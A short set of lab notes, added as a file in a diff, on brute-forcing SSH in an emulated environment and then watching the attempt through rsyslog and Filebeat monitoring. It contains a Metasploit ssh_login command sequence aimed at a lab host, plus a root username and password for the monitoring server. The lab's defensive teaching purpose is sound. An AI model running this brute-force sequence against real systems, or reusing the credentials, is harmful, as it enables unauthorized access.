@@ -1,0 +1,55 @@
+Open source monitoring log (How to ban an attacker)
+
+
+ip addr 208.8.8.126
+
+
+create file for users and pass
+---------------------------------------------------------------
+1st emulator
+
+sudo su
+
+enter pass
+
+msfconsole (allow to perfrom vulnerability assessment)
+
+search ssh_login
+use 0
+show options
+set rhosts 208.8.8.133
+set USERS_file /rivan/kali/Desktop/USERS.txt
+set PASS_file /rivan/kali/Desktop/PASS.txt
+set stop_on_success true
+set verbose true
+show options
+exploit
+
+---------------------------------------------------------------
+2nd emulator
+
+sudo systemctl status ssh
+
+
+
+---------------------------------------------------------------
+ElasticSys
+
+root
+C1sc0123
+
+ip addr = 208.8.8.133
+
+---------------------------------------------------------------
+
+SecureCRT
+
+SSH 
+
+enter ip from ElasticSys
+
+enter creds from ElasticSys
+
+enter below per line command:
+1. sudo systemctl status rsyslog
+2. sudo nano /etc/filebeat/filebeat.yml
